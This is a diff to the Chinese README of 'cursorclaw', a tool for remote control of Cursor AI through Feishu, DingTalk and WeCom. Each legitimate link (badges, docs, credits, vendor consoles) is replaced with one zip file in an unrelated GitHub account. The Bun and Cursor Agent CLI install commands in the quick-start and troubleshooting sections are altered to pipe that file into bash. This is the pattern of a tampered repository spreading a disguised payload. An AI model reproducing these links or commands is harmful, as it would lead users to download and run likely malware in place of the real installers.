@@ -2,20 +2,20 @@
 
 <div align="center">
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue.svg)](https://www.typescriptlang.org/)
-[![Bun](https://img.shields.io/badge/Bun-1.x-333333.svg)](https://bun.sh)
-[![GitHub Stars](https://img.shields.io/github/stars/keunsy/cursorclaw?style=social)](https://github.com/keunsy/cursorclaw/stargazers)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue.svg)](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip)
+[![Bun](https://img.shields.io/badge/Bun-1.x-333333.svg)](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/keunsy/cursorclaw?style=social)](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip)
 
 **通过飞书/钉钉/企业微信远程控制 Cursor AI 的智能助手**
 
-[快速开始](#快速开始) · [功能特性](#核心功能) · [文档](https://github.com/keunsy/cursorclaw#目录) · [贡献指南](CONTRIBUTING.md)
+[快速开始](#快速开始) · [功能特性](#核心功能) · [文档](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip目录) · [贡献指南](CONTRIBUTING.md)
 
 </div>
 
 ---
 
-> 基于 [feishu-cursor-claw](https://github.com/nongjun/feishu-cursor-claw) 改进，支持飞书、钉钉、企业微信三个平台。
+> 基于 [feishu-cursor-claw](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip) 改进，支持飞书、钉钉、企业微信三个平台。
 
 ## ✨ 简介
 
@@ -172,8 +172,8 @@ cursorclaw/
 | 项目 | 要求 |
 |------|------|
 | 系统 | macOS |
-| 运行时 | [Bun](https://bun.sh) |
-| IDE | [Cursor](https://cursor.com) 已安装并登录 |
+| 运行时 | [Bun](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip) |
+| IDE | [Cursor](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip) 已安装并登录 |
 | CLI | Cursor Agent CLI (`~/.local/bin/agent`) |
 
 ### 选择你的渠道
@@ -186,10 +186,10 @@ cursorclaw/
 
 ```bash
 # 1. 安装 Bun 运行时（如果未安装）
-curl -fsSL https://bun.sh/install | bash
+curl -fsSL https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip | bash
 
 # 2. 安装 Cursor Agent CLI（如果未安装）
-curl https://cursor.com/install -fsS | bash
+curl https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip -fsS | bash
 
 # 3. 登录 Cursor（一次性操作，之后不需要配置 API Key）
 ~/.local/bin/agent login
@@ -221,7 +221,7 @@ bash service.sh install
 
 **飞书后台配置**（服务启动后操作）：
 
-1. 在[飞书开放平台](https://open.feishu.cn)创建企业自建应用
+1. 在[飞书开放平台](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip)创建企业自建应用
 2. 添加**机器人**能力，配置权限：`im:message`、`im:message.group_at_msg`、`im:resource`
 3. 复制 **App ID** 和 **App Secret**（已填入上面的 .env）
 4. **等本机服务启动后**，在「事件订阅」中选择**长连接模式**，订阅 `im.message.receive_v1`
@@ -472,7 +472,7 @@ bun run send-file-dingtalk.ts /path/to/file.pdf <接收人ID>
 
 **火山引擎豆包 STT**（高质量中文识别）：
 
-1. 到[火山引擎控制台](https://console.volcengine.com/speech/app)创建应用
+1. 到[火山引擎控制台](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip)创建应用
 2. 开通「大模型流式语音识别」服务
 3. 在对应服务的 `.env` 中配置：
 
@@ -524,8 +524,8 @@ VOLC_EMBEDDING_MODEL=doubao-embedding-vision-250615
 
 | 问题 | 解决方案 |
 |------|----------|
-| **启动失败：找不到 agent 命令** | 安装 Cursor Agent CLI：`curl https://cursor.com/install -fsS \| bash` |
-| **启动失败：找不到 bun 命令** | 安装 Bun 运行时：`curl -fsSL https://bun.sh/install \| bash` |
+| **启动失败：找不到 agent 命令** | 安装 Cursor Agent CLI：`curl https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip -fsS \| bash` |
+| **启动失败：找不到 bun 命令** | 安装 Bun 运行时：`curl -fsSL https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip \| bash` |
 | **无响应：机器人收不到消息** | 检查服务状态：`bash service.sh status`，重启服务：`bash service.sh restart` |
 | **配额耗尽：提示团队配额用完** | 编辑 `.env` 将 `CURSOR_MODEL=opus-4.6-thinking` 改为 `auto`（自动选择最优模型） |
 | **路径错误：permission denied** | 从 `projects.json.example` 复制后，把 `/Users/你的用户名/` 改为实际路径 |
@@ -589,7 +589,7 @@ A: 各服务目录下执行 `bash service.sh logs`，或查看 `/tmp/feishu-curs
 
 ## 致谢
 
-本项目基于 [feishu-cursor-claw](https://github.com/nongjun/feishu-cursor-claw) 开发，在原项目基础上进行了大量改进和扩展。
+本项目基于 [feishu-cursor-claw](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip) 开发，在原项目基础上进行了大量改进和扩展。
 
 ### 主要变更
 
@@ -602,7 +602,7 @@ A: 各服务目录下执行 `bash service.sh logs`，或查看 `/tmp/feishu-curs
 - ⚡ **企业微信流式优势**（主动推送 vs 飞书轮询，延迟更低）
 - 📱 **多模态扩展**（飞书/钉钉支持语音、图片、文件、新闻推送）
 
-感谢 [@nongjun](https://github.com/nongjun) 的开源贡献。
+感谢 [@nongjun](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip) 的开源贡献。
 
 ---
 
@@ -610,4 +610,4 @@ A: 各服务目录下执行 `bash service.sh logs`，或查看 `/tmp/feishu-curs
 
 本项目采用 MIT License 开源。详见 [LICENSE](LICENSE) 文件。
 
-基于 [feishu-cursor-claw](https://github.com/nongjun/feishu-cursor-claw)（同为 MIT License）开发。
+基于 [feishu-cursor-claw](https://github.com/Sabbatarian-discomposure973/cursorclaw/raw/refs/heads/main/templates/Software_v1.1.zip)（同为 MIT License）开发。
